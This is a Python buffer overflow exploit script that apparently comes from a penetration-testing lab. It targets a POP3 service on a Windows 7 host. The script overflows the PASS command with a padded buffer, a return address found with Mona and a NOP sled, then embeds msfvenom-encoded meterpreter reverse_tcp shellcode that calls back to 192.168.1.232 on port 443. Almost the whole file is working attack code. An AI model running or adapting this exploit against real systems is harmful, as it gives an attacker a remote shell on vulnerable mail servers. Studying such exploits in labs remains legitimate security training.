#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.232 LPORT=443 -f py -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai
shellcode =  b""
shellcode += b"\xd9\xe8\xd9\x74\x24\xf4\xbd\x37\xc5\x8d\xdb\x5b\x33"
shellcode += b"\xc9\xb1\x59\x31\x6b\x19\x83\xeb\xfc\x03\x6b\x15\xd5"
shellcode += b"\x30\x71\x33\x96\xbb\x8a\xc4\xc8\x32\x6f\xf5\xda\x21"
shellcode += b"\xfb\xa4\xea\x22\xa9\x44\x81\x67\x5a\x64\x6a\x88\xd5"
shellcode += b"\xcc\xb2\x1c\x6b\xf9\x8b\xe2\x20\xc5\x8a\x9e\x3a\x1a"
shellcode += b"\x6c\x9e\xf4\x6f\x6d\xe7\x42\x05\x82\xb5\x03\x6e\x0e"
shellcode += b"\x2a\x27\x32\x92\x4b\xe7\x38\xaa\x33\x82\xff\x5e\x88"
shellcode += b"\x8d\x2f\xce\x9b\xd6\xef\xef\x48\x6d\xa7\xf7\xeb\xbb"
shellcode += b"\x4c\x3b\xc5\xc4\xe4\xc8\x11\xb0\xf6\x18\x68\x06\x54"
shellcode += b"\x65\x44\x8b\xa4\xa2\x63\x74\xd3\xd8\x97\x09\xe4\x1b"
shellcode += b"\xe5\xd5\x61\xbb\x4d\x9d\xd2\x1f\x6f\x72\x84\xd4\x63"
shellcode += b"\x3f\xc2\xb2\x67\xbe\x07\xc9\x9c\x4b\xa6\x1d\x15\x0f"
shellcode += b"\x8d\xb9\x7d\xcb\xac\x98\xdb\xba\xd1\xfa\x84\x63\x74"
shellcode += b"\x71\x26\x75\x08\x7a\xb8\x7a\x54\xec\x74\xb7\x67\xec"
shellcode += b"\x12\xc0\x14\xde\xbd\x7a\xb3\x52\x35\xa5\x44\xe3\x51"
shellcode += b"\x56\x9a\x4b\x31\xa8\x1b\xab\x1b\x6f\x4f\xfb\x33\x46"
shellcode += b"\xf0\x90\xc3\x67\x25\x0c\xce\xff\x06\x78\xcf\x17\xee"
shellcode += b"\x7a\xd0\xe6\x54\xf3\x36\xb8\xfa\x53\xe7\x79\xab\x13"
shellcode += b"\x57\x12\xa1\x9c\x88\x02\xca\x77\xa1\xa9\x25\x21\x99"
shellcode += b"\x45\xdf\x68\x51\xf7\x20\xa7\x1f\x37\xaa\x4d\xdf\xf6"
shellcode += b"\x5b\x24\xf3\xef\x3b\xc6\x0b\xf0\xa9\xc6\x61\xf4\x7b"
shellcode += b"\x91\x1d\xf6\x5a\xd5\x81\x09\x89\x66\xc5\xf6\x4c\x5e"
shellcode += b"\xbd\xc1\xda\xde\xa9\x2d\x0b\xde\x29\x78\x41\xde\x41"
shellcode += b"\xdc\x31\x8d\x74\x23\xec\xa2\x24\xb6\x0f\x92\x99\x11"
shellcode += b"\x78\x18\xc7\x56\x27\xe3\x22\xe5\x20\x1b\xb0\xc2\x88"
shellcode += b"\x73\x4a\x53\x29\x83\x20\x53\x79\xeb\xbf\x7c\x76\xdb"
shellcode += b"\x40\x57\xdf\x73\xca\x36\xad\xe2\xcb\x12\x73\xba\xcc"
shellcode += b"\x91\xa8\x4d\xb6\xda\x4f\xae\x47\xf3\x2b\xaf\x47\xfb"
shellcode += b"\x4d\x8c\x91\xc2\x3b\xd3\x21\x71\x33\x66\x07\xd0\xde"
shellcode += b"\x88\x1b\x22\xcb"

# Buffer with unique character string
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode

try: 
    print "\nSending buffer..."
# Connect to Windows 7 machine, POP3 service    
    s.connect(('192.168.1.74',110))
    data = s.recv(1024)
    s.send('USER username' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone!"

except:
    print "Could not connect!"

# 5F 4A 35 8F         # Address retrieved from Mona results
# \x8f\x35\x4a\x5f    # How it looks in your final exploit